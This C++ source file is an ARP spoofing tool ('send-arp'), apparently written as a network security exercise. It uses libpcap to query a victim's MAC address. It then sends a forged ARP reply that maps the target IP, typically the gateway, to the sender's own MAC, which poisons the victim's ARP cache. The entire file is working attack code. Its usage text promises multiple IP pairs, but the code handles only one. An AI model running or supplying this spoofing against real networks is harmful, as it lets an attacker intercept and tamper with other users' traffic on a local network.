#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <ifaddrs.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool get_interface_info(const char* interface, Mac& mac, Ip& ip) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    
    // Get MAC address
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) != 0) return false;
    mac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);

    // Get IP address
    if (ioctl(fd, SIOCGIFADDR, &ifr) != 0) return false;
    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    ip = Ip(inet_ntoa(ipaddr->sin_addr));

	// printf("%s: %s, %s\n", interface, std::string(mac).c_str(), std::string(ip).c_str());
    close(fd);
    return true;
}

Mac get_sender_mac(pcap_t* handle, Mac my_mac, Ip my_ip, Ip sender_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return Mac::nullMac();
    }

    while (true) {
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            return Mac::nullMac();
        }
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* recv_packet = (EthArpPacket*)packet;
        if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp &&
            ntohs(recv_packet->arp_.op_) == ArpHdr::Reply &&
            Ip(recv_packet->arp_.sip()) == sender_ip) {
                return recv_packet->arp_.smac_;
        }
    }

    return Mac::nullMac();
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac my_mac;
    Ip my_ip;
    if (!get_interface_info(dev, my_mac, my_ip)) {
        fprintf(stderr, "couldn't get interface info for %s\n", dev);
        return -1;
    }

    Ip sender_ip = Ip(argv[2]);
    Ip target_ip = Ip(argv[3]);

    Mac sender_mac = get_sender_mac(handle, my_mac, my_ip, sender_ip);
    printf("%s",::std::string(sender_mac).c_str());
    if (sender_mac == Mac::nullMac()) {
        fprintf(stderr, "couldn't get sender's MAC address\n");
        return -1;
    }

    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}